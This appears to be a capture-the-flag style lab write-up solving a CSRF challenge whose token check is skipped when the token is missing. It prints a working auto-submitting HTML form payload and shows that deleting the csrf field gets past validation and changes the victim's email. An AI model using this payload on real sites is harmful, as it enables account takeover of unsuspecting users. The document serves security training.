# Lab: CSRF where token validation depends on token being present

 This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Step 1 Walk the application's change email function using burp

I login to the provided account, and change my email to test@test.com:

![image](https://user-images.githubusercontent.com/83407557/210830473-21617b48-a168-4817-b640-71f1bf4b5759.png)

Having used burp with intercept off, I can see the request in my http history:

![image](https://user-images.githubusercontent.com/83407557/210830803-341bdd85-50b6-4e4b-9f3a-1b9bba82dce9.png)

# Step 2 Create a POC

I send this request to engagement tools->CSRF POC gen

![image](https://user-images.githubusercontent.com/83407557/210831033-5e147504-d229-45ae-90d6-f588360284f8.png)

Under options I turn on auto-submit script and change the email to hermh4cks%40gmail.com (hermh4cks@gmail.com) then regenerate the payload:

**CSRF Payload POC**
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0aa6005103e26d23c3adf6b4007d00bf.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hermh4cks&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="okPzcS8RpATBXV4FGzjcHNbrd5GynTcE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Step 3 Host CSRF Payload on attack-server

I add the payload to the body of /exploit on my server and save it with "Store":

![image](https://user-images.githubusercontent.com/83407557/210831936-21835408-11ff-4165-a713-56498520a9ea.png)

# Step 4 Test POC on wiener user

I click View Exploit to get it to execute, however I get an invalid CSRF token error:

![image](https://user-images.githubusercontent.com/83407557/210832414-00c1240e-b849-4d59-b8d7-f5a8c908663d.png)

# Step 5 remove CSRF token from POC

I delete the following element from my POC:

```html
<input type="hidden" name="csrf" value="okPzcS8RpATBXV4FGzjcHNbrd5GynTcE" />
```

And then store the payload again:

![image](https://user-images.githubusercontent.com/83407557/210832828-bb520f55-3c37-459d-ad28-654ea5138023.png)

# Step 6 retest the exploit on Wiener

This time when I view the exploit, the request is sent without a CSRF value and the attack works, changing wiener's email to hermh4cks@gmail.com:

![image](https://user-images.githubusercontent.com/83407557/210833130-282707eb-752d-483e-a74d-64190c45a0cb.png)


# Step 7 Send exploit to victim

Back on my attack server, I send the exploit to the victim:

![image](https://user-images.githubusercontent.com/83407557/210833359-8de47bb3-8c77-49e8-b18a-136d368c9f95.png)

Doing so, changes the vicim's email to an email I control and solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210833521-3898988d-aeeb-468b-bfe7-f35b3576d16c.png)





